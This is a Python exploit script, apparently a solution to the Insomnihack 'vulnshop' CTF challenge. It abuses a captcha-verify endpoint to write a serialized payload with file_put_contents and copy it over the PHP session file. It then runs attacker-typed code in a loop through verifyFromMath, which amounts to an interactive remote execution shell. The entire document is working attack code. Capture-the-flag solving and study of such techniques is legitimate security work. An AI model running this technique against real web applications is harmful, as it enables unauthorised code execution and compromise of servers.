import requests
import re
from bs4 import BeautifulSoup

while True:
    code = raw_input(">> ")
    payload = "challenge|s:{}:\"{}\";".format(len(code), code)
    # new session
    req = requests.get('http://vulnshop.teaser.insomnihack.ch/?page=contactus')
    cookie = req.headers['Set-Cookie']
    PHPSESSID = re.match(r'PHPSESSID=(\w+);',cookie).group(1)
    cookies = {
        'PHPSESSID': PHPSESSID
    }

    # fill challenge file with payload
    data = {
        'method': 'file_put_contents',
        'answer': payload
    }

    requests.post('http://vulnshop.teaser.insomnihack.ch/?page=captcha-verify', data=data, cookies=cookies)

    # overwrite session file
    data = {
        'method': 'copy',
        'answer': '/var/lib/php/sessions/sess_'+PHPSESSID
    }

    requests.post('http://vulnshop.teaser.insomnihack.ch/?page=captcha-verify', data=data, cookies=cookies)

    # visit ?page=captcha to see $_SESSION['challenge'] value

    req = requests.get('http://vulnshop.teaser.insomnihack.ch/?page=captcha', cookies=cookies)
    if code in req.text:
        print("OK")

    data = {
        'method': 'verifyFromMath',
        'answer': '1'
    }
    req = requests.post('http://vulnshop.teaser.insomnihack.ch/?page=captcha-verify', data=data, cookies=cookies)
    soup = BeautifulSoup(req.text, "html.parser")
    line = soup.find('div', attrs={'class': 'content'})
    print("result: \n{}".format(line.text))
